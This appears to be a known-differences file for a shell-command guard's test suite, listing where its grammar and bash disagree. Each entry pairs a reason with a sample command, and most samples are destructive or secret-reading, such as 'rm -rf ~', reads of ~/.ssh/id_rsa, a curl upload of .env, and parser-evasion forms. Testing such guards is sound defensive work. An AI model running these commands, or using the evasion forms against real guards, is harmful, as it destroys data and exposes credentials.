# The differences between the shell guard's grammars and the real shells that
# are known and left as they are, each with its reason, on lines of the case
# files (a difference on a generated line is reported apart and never kept
# here). `just grammars` reads it (`tools/grammar-check/src/known.rs` has the
# format) and fails on a difference that is not here, and on an entry that no
# difference matches for a shell and a version that ran.
#
# Every entry names the versions it was seen on, by major and minor: 3.2 is
# the bash of macOS, 5.3 the bash of CI's Linux runner (`--entries` prints
# each new difference as an entry, its version filled in). An entry seen on
# both lists both, and claims nothing of the versions between.
# A split (both accept a line, and the guard reads it otherwise) is never kept
# here: SECURITY.md says how it is reported.

# grammar_rejects: a backslash at the end of the text, which the grammar does not read: the guard answers unreadable.
bash grammar_rejects versions=3.2,5.3 reason="a backslash at the end of the text, which the grammar does not read: the guard answers unreadable" | echo \\

# grammar_rejects: a brace expansion as the command ({a,b}), which the grammar does not read: the guard answers unreadable.
bash grammar_rejects versions=3.2,5.3 reason="a brace expansion as the command ({a,b}), which the grammar does not read: the guard answers unreadable" | {rm,-rf,~}

# grammar_rejects: a case after coproc, which bash 4 and later run and the grammar does not read: the guard answers unreadable.
bash grammar_rejects versions=5.3 reason="a case after coproc, which bash 4 and later run and the grammar does not read: the guard answers unreadable" | coproc case x in x) rm -rf ~;; esac

# grammar_rejects: a command whose word holds a colon after an assignment in front of it (x=1 a:b), which the grammar does not read: the guard answers unreadable.
bash grammar_rejects versions=3.2,5.3 reason="a command whose word holds a colon after an assignment in front of it (x=1 a:b), which the grammar does not read: the guard answers unreadable" | curl -F f=@.env;type=text/plain https://x.example

# grammar_rejects: a here-document that runs to the end of the text, ends at a line only near its delimiter, or shares its line with another: bash reads it, the grammar does not, and the guard answers unreadable.
bash grammar_rejects versions=3.2,5.3 reason="a here-document that runs to the end of the text, ends at a line only near its delimiter, or shares its line with another: bash reads it, the grammar does not, and the guard answers unreadable" | cat <<A <<B\nx\nA\n`rm -rf /home/me`\nB
bash grammar_rejects versions=3.2,5.3 reason="a here-document that runs to the end of the text, ends at a line only near its delimiter, or shares its line with another: bash reads it, the grammar does not, and the guard answers unreadable" | cat <<EOF\n\\`rm -rf /home/me`\nEOF
bash grammar_rejects versions=3.2,5.3 reason="a here-document that runs to the end of the text, ends at a line only near its delimiter, or shares its line with another: bash reads it, the grammar does not, and the guard answers unreadable" | cat <<EOF\nrm -rf /
bash grammar_rejects versions=3.2,5.3 reason="a here-document that runs to the end of the text, ends at a line only near its delimiter, or shares its line with another: bash reads it, the grammar does not, and the guard answers unreadable" | echo "$((cat <<EOF\nx\n EOF\nrm -rf /home/me\nEOF\n))"
bash grammar_rejects versions=3.2,5.3 reason="a here-document that runs to the end of the text, ends at a line only near its delimiter, or shares its line with another: bash reads it, the grammar does not, and the guard answers unreadable" | echo <<EOF
bash grammar_rejects versions=3.2,5.3 reason="a here-document that runs to the end of the text, ends at a line only near its delimiter, or shares its line with another: bash reads it, the grammar does not, and the guard answers unreadable" | echo x <<'EOF'\nrm -rf /
bash grammar_rejects versions=3.2,5.3 reason="a here-document that runs to the end of the text, ends at a line only near its delimiter, or shares its line with another: bash reads it, the grammar does not, and the guard answers unreadable" | node <<'EOF'\nlet a = 1\n EOF\nrequire('fs').rmSync('/home/me')\nEOF
bash grammar_rejects versions=3.2,5.3 reason="a here-document that runs to the end of the text, ends at a line only near its delimiter, or shares its line with another: bash reads it, the grammar does not, and the guard answers unreadable" | python3 - <<'PY' <<'PY2'\nprint(1)\nPY\nprint(2)\nPY2

# grammar_rejects: a redirect of a group (a numbered <, <>, <<<) that the grammar does not read: the guard answers unreadable.
bash grammar_rejects versions=3.2,5.3 reason="a redirect of a group (a numbered <, <>, <<<) that the grammar does not read: the guard answers unreadable" | { cd sub; } 0< ../../.ssh/id_rsa
bash grammar_rejects versions=3.2,5.3 reason="a redirect of a group (a numbered <, <>, <<<) that the grammar does not read: the guard answers unreadable" | { cd sub; } <<< x
bash grammar_rejects versions=3.2,5.3 reason="a redirect of a group (a numbered <, <>, <<<) that the grammar does not read: the guard answers unreadable" | { cd sub; } <> ../../.ssh/id_rsa

# grammar_rejects: parameter expansions nested ten deep, which bash 3.2 does not check while it parses: the guard answers unreadable.
bash grammar_rejects versions=3.2,5.3 reason="parameter expansions nested ten deep, which bash 3.2 does not check while it parses: the guard answers unreadable" | ${a${a${a${a${a${a${a${a${a${a}}}}}}}}}}${a${a${a${a${a${a${a${a${a${a}}}}}}}}}}

# shell_rejects: [[ -v, which bash 3.2 does not have (bash 4.2 added it).
bash shell_rejects versions=3.2 reason="[[ -v, which bash 3.2 does not have (bash 4.2 added it)" | unset 'a[1]' x; [[ -v a[0] ]]
bash shell_rejects versions=3.2 reason="[[ -v, which bash 3.2 does not have (bash 4.2 added it)" | x='a[$(rm -rf ~)]'; [[ -v 'a[x]' ]]

# shell_rejects: a ! after coproc, which bash 4 and later refuse (bash 3.2, which has no coproc, reads it as a word).
bash shell_rejects versions=5.3 reason="a ! after coproc, which bash 4 and later refuse (bash 3.2, which has no coproc, reads it as a word)" | coproc ! rm -rf ~

# shell_rejects: a function definition after coproc, which bash refuses (bash 3.2, which has no coproc, at its closing brace).
bash shell_rejects versions=3.2,5.3 reason="a function definition after coproc, which bash refuses (bash 3.2, which has no coproc, at its closing brace)" | coproc function f { rm -rf ~; }

# shell_rejects: a group after coproc left open, which bash 4 and later refuse at the end of the text (bash 3.2, which has no coproc, reads its words as words).
bash shell_rejects versions=5.3 reason="a group after coproc left open, which bash 4 and later refuse at the end of the text (bash 3.2, which has no coproc, reads its words as words)" | coproc NAME {
bash shell_rejects versions=5.3 reason="a group after coproc left open, which bash 4 and later refuse at the end of the text (bash 3.2, which has no coproc, reads its words as words)" | coproc {
bash shell_rejects versions=5.3 reason="a group after coproc left open, which bash 4 and later refuse at the end of the text (bash 3.2, which has no coproc, reads its words as words)" | coproc { ls }
bash shell_rejects versions=5.3 reason="a group after coproc left open, which bash 4 and later refuse at the end of the text (bash 3.2, which has no coproc, reads its words as words)" | coproc { ls; '}'

# shell_rejects: a group written with no space after {, as zsh allows, which bash reads as a word.
bash shell_rejects versions=3.2,5.3 reason="a group written with no space after {, as zsh allows, which bash reads as a word" | ! {rm -rf ~;}
bash shell_rejects versions=3.2,5.3 reason="a group written with no space after {, as zsh allows, which bash reads as a word" | coproc NAME {rm -rf ~;}
bash shell_rejects versions=3.2,5.3 reason="a group written with no space after {, as zsh allows, which bash reads as a word" | coproc { {rm -rf ~;}; }
bash shell_rejects versions=3.2,5.3 reason="a group written with no space after {, as zsh allows, which bash reads as a word" | coproc {ls;}
bash shell_rejects versions=3.2,5.3 reason="a group written with no space after {, as zsh allows, which bash reads as a word" | coproc {rm -rf ~;}
bash shell_rejects versions=3.2,5.3 reason="a group written with no space after {, as zsh allows, which bash reads as a word" | coproc {{rm -rf ~;};}
bash shell_rejects versions=3.2,5.3 reason="a group written with no space after {, as zsh allows, which bash reads as a word" | time {rm -rf ~;}

# shell_rejects: a parenthesis in a parameter expansion inside $( ), which bash 3.2 takes as part of the substitution.
bash shell_rejects versions=3.2 reason="a parenthesis in a parameter expansion inside $( ), which bash 3.2 takes as part of the substitution" | echo "$(echo ${x#*(}) it's"\nr\\\nm -rf /home/me
bash shell_rejects versions=3.2 reason="a parenthesis in a parameter expansion inside $( ), which bash 3.2 takes as part of the substitution" | echo "$(echo ${x%(*}) it's"\nls
bash shell_rejects versions=3.2 reason="a parenthesis in a parameter expansion inside $( ), which bash 3.2 takes as part of the substitution" | echo "$(echo ${x%(*}) it's"\nr\\\nm -rf /home/me
bash shell_rejects versions=3.2 reason="a parenthesis in a parameter expansion inside $( ), which bash 3.2 takes as part of the substitution" | echo "$(echo ${x/(/y}) it's"
bash shell_rejects versions=3.2 reason="a parenthesis in a parameter expansion inside $( ), which bash 3.2 takes as part of the substitution" | echo "$(echo ${x/(/y}) it's"\nr\\\nm -rf /home/me
bash shell_rejects versions=3.2 reason="a parenthesis in a parameter expansion inside $( ), which bash 3.2 takes as part of the substitution" | echo "$(echo ${x/(/y})" && echo "it's" && r\\\nm -rf /home/me
bash shell_rejects versions=3.2 reason="a parenthesis in a parameter expansion inside $( ), which bash 3.2 takes as part of the substitution" | echo "$(echo ${x//(/}) it's"\nr\\\nm -rf /home/me
bash shell_rejects versions=3.2 reason="a parenthesis in a parameter expansion inside $( ), which bash 3.2 takes as part of the substitution" | echo $(echo ${x/(/y}) "it's"\nr\\\nm -rf /home/me

# shell_rejects: a quoted here-document delimiter that holds a ;, which bash 3.2 does not read as one word.
bash shell_rejects versions=3.2,5.3 reason="a quoted here-document delimiter that holds a ;, which bash 3.2 does not read as one word" | cat <<'E;F\nx\nE;F

# shell_rejects: a reserved word or a brace where bash takes none, which the grammar reads as a word; bash refuses the text there.
bash shell_rejects versions=3.2,5.3 reason="a reserved word or a brace where bash takes none, which the grammar reads as a word; bash refuses the text there" | coproc ls; }
bash shell_rejects versions=3.2,5.3 reason="a reserved word or a brace where bash takes none, which the grammar reads as a word; bash refuses the text there" | coproc { ls; }; }
bash shell_rejects versions=3.2,5.3 reason="a reserved word or a brace where bash takes none, which the grammar reads as a word; bash refuses the text there" | coproc { { ls; }
bash shell_rejects versions=3.2,5.3 reason="a reserved word or a brace where bash takes none, which the grammar reads as a word; bash refuses the text there" | do rm -rf ~
bash shell_rejects versions=3.2,5.3 reason="a reserved word or a brace where bash takes none, which the grammar reads as a word; bash refuses the text there" | ls; }
bash shell_rejects versions=3.2,5.3 reason="a reserved word or a brace where bash takes none, which the grammar reads as a word; bash refuses the text there" | then rm -rf ~
bash shell_rejects versions=3.2,5.3 reason="a reserved word or a brace where bash takes none, which the grammar reads as a word; bash refuses the text there" | time { ls
bash shell_rejects versions=3.2,5.3 reason="a reserved word or a brace where bash takes none, which the grammar reads as a word; bash refuses the text there" | time { ls; }; }

# shell_rejects: a word after the redirect of a compound command, which bash refuses.
bash shell_rejects versions=3.2,5.3 reason="a word after the redirect of a compound command, which bash refuses" | (ls) >out rm -rf ~
bash shell_rejects versions=3.2,5.3 reason="a word after the redirect of a compound command, which bash refuses" | f() { ls; } >out rm -rf ~
bash shell_rejects versions=3.2,5.3 reason="a word after the redirect of a compound command, which bash refuses" | for i in 1; do ls; done >out rm -rf ~
bash shell_rejects versions=3.2,5.3 reason="a word after the redirect of a compound command, which bash refuses" | { ls; } >out rm -rf ~

# shell_rejects: a zsh glob qualifier such as (D), whose parenthesis bash refuses; the guard reads it as zsh does.
bash shell_rejects versions=3.2,5.3 reason="a zsh glob qualifier such as (D), whose parenthesis bash refuses; the guard reads it as zsh does" | ( rm -rf *.o(D) ); rm -rf *git
bash shell_rejects versions=3.2,5.3 reason="a zsh glob qualifier such as (D), whose parenthesis bash refuses; the guard reads it as zsh does" | ( rm -rf *git(D) )
bash shell_rejects versions=3.2,5.3 reason="a zsh glob qualifier such as (D), whose parenthesis bash refuses; the guard reads it as zsh does" | builtin eval rm -rf *git(D)
bash shell_rejects versions=3.2,5.3 reason="a zsh glob qualifier such as (D), whose parenthesis bash refuses; the guard reads it as zsh does" | cat *.md(D)
bash shell_rejects versions=3.2,5.3 reason="a zsh glob qualifier such as (D), whose parenthesis bash refuses; the guard reads it as zsh does" | cat x > *git(D)
bash shell_rejects versions=3.2,5.3 reason="a zsh glob qualifier such as (D), whose parenthesis bash refuses; the guard reads it as zsh does" | cat ~/.ssh/*(D)
bash shell_rejects versions=3.2,5.3 reason="a zsh glob qualifier such as (D), whose parenthesis bash refuses; the guard reads it as zsh does" | cd sub && rm -rf *git(D)
bash shell_rejects versions=3.2,5.3 reason="a zsh glob qualifier such as (D), whose parenthesis bash refuses; the guard reads it as zsh does" | cd sub; rm -rf *git(D)
bash shell_rejects versions=3.2,5.3 reason="a zsh glob qualifier such as (D), whose parenthesis bash refuses; the guard reads it as zsh does" | command eval rm -rf *git(D)
bash shell_rejects versions=3.2,5.3 reason="a zsh glob qualifier such as (D), whose parenthesis bash refuses; the guard reads it as zsh does" | command rm -rf *git(D)
bash shell_rejects versions=5.3 reason="a zsh glob qualifier such as (D), whose parenthesis bash refuses; the guard reads it as zsh does" | echo $(rm -rf *git(D))
bash shell_rejects versions=3.2,5.3 reason="a zsh glob qualifier such as (D), whose parenthesis bash refuses; the guard reads it as zsh does" | echo *.o(D) | rm -rf *git
bash shell_rejects versions=3.2,5.3 reason="a zsh glob qualifier such as (D), whose parenthesis bash refuses; the guard reads it as zsh does" | echo *git(D)
bash shell_rejects versions=3.2,5.3 reason="a zsh glob qualifier such as (D), whose parenthesis bash refuses; the guard reads it as zsh does" | echo ^x; rm -rf *.o(D)
bash shell_rejects versions=3.2,5.3 reason="a zsh glob qualifier such as (D), whose parenthesis bash refuses; the guard reads it as zsh does" | echo a~b; rm -rf *.o(D)
bash shell_rejects versions=3.2,5.3 reason="a zsh glob qualifier such as (D), whose parenthesis bash refuses; the guard reads it as zsh does" | echo hi && rm -rf *git(D)
bash shell_rejects versions=3.2,5.3 reason="a zsh glob qualifier such as (D), whose parenthesis bash refuses; the guard reads it as zsh does" | echo hi; rm -rf *git(D)
bash shell_rejects versions=3.2,5.3 reason="a zsh glob qualifier such as (D), whose parenthesis bash refuses; the guard reads it as zsh does" | env rm -rf *git(D)
bash shell_rejects versions=3.2,5.3 reason="a zsh glob qualifier such as (D), whose parenthesis bash refuses; the guard reads it as zsh does" | eval 'rm -rf' *git(D)
bash shell_rejects versions=3.2,5.3 reason="a zsh glob qualifier such as (D), whose parenthesis bash refuses; the guard reads it as zsh does" | eval echo *.o(D); rm -rf *git
bash shell_rejects versions=3.2,5.3 reason="a zsh glob qualifier such as (D), whose parenthesis bash refuses; the guard reads it as zsh does" | eval echo hi\\; rm -rf *git(D)
bash shell_rejects versions=3.2,5.3 reason="a zsh glob qualifier such as (D), whose parenthesis bash refuses; the guard reads it as zsh does" | eval rm -rf *.o(D)
bash shell_rejects versions=3.2,5.3 reason="a zsh glob qualifier such as (D), whose parenthesis bash refuses; the guard reads it as zsh does" | eval rm -rf *git(D)
bash shell_rejects versions=3.2,5.3 reason="a zsh glob qualifier such as (D), whose parenthesis bash refuses; the guard reads it as zsh does" | eval rm -rf -- *git(D)
bash shell_rejects versions=3.2,5.3 reason="a zsh glob qualifier such as (D), whose parenthesis bash refuses; the guard reads it as zsh does" | f() { rm -rf *git(D); }; f
bash shell_rejects versions=3.2,5.3 reason="a zsh glob qualifier such as (D), whose parenthesis bash refuses; the guard reads it as zsh does" | for f in *git(D); do rm -rf "$f"; done
bash shell_rejects versions=3.2,5.3 reason="a zsh glob qualifier such as (D), whose parenthesis bash refuses; the guard reads it as zsh does" | for f in *git(D); do rm -rf $f; done
bash shell_rejects versions=3.2,5.3 reason="a zsh glob qualifier such as (D), whose parenthesis bash refuses; the guard reads it as zsh does" | if true; then rm -rf *git(D); fi
bash shell_rejects versions=3.2,5.3 reason="a zsh glob qualifier such as (D), whose parenthesis bash refuses; the guard reads it as zsh does" | ls *.o(D); rm -rf *git
bash shell_rejects versions=3.2,5.3 reason="a zsh glob qualifier such as (D), whose parenthesis bash refuses; the guard reads it as zsh does" | ls *git(D)
bash shell_rejects versions=3.2,5.3 reason="a zsh glob qualifier such as (D), whose parenthesis bash refuses; the guard reads it as zsh does" | ls -d **/*git(D) | xargs rm -rf
bash shell_rejects versions=3.2,5.3 reason="a zsh glob qualifier such as (D), whose parenthesis bash refuses; the guard reads it as zsh does" | ls -d *git(D) | xargs rm -rf
bash shell_rejects versions=3.2,5.3 reason="a zsh glob qualifier such as (D), whose parenthesis bash refuses; the guard reads it as zsh does" | ls .git(D)
bash shell_rejects versions=3.2,5.3 reason="a zsh glob qualifier such as (D), whose parenthesis bash refuses; the guard reads it as zsh does" | ls README.md(D)
bash shell_rejects versions=3.2,5.3 reason="a zsh glob qualifier such as (D), whose parenthesis bash refuses; the guard reads it as zsh does" | ls ~/*.o(D)
bash shell_rejects versions=3.2,5.3 reason="a zsh glob qualifier such as (D), whose parenthesis bash refuses; the guard reads it as zsh does" | mv [[.x.]*git(D) /tmp/x
bash shell_rejects versions=3.2,5.3 reason="a zsh glob qualifier such as (D), whose parenthesis bash refuses; the guard reads it as zsh does" | noglob eval rm -rf *git(D)
bash shell_rejects versions=3.2,5.3 reason="a zsh glob qualifier such as (D), whose parenthesis bash refuses; the guard reads it as zsh does" | noglob rm -rf *git(D)
bash shell_rejects versions=3.2,5.3 reason="a zsh glob qualifier such as (D), whose parenthesis bash refuses; the guard reads it as zsh does" | rm -f *.o(D) *.a(D)
bash shell_rejects versions=3.2,5.3 reason="a zsh glob qualifier such as (D), whose parenthesis bash refuses; the guard reads it as zsh does" | rm -f [[.x.]*.o(D)
bash shell_rejects versions=3.2,5.3 reason="a zsh glob qualifier such as (D), whose parenthesis bash refuses; the guard reads it as zsh does" | rm -f src/*.o(D)
bash shell_rejects versions=3.2,5.3 reason="a zsh glob qualifier such as (D), whose parenthesis bash refuses; the guard reads it as zsh does" | rm -r *git(D)
bash shell_rejects versions=3.2,5.3 reason="a zsh glob qualifier such as (D), whose parenthesis bash refuses; the guard reads it as zsh does" | rm -rf *(D)
bash shell_rejects versions=3.2,5.3 reason="a zsh glob qualifier such as (D), whose parenthesis bash refuses; the guard reads it as zsh does" | rm -rf ***/*.o(D)
bash shell_rejects versions=3.2,5.3 reason="a zsh glob qualifier such as (D), whose parenthesis bash refuses; the guard reads it as zsh does" | rm -rf ***/*git(D)
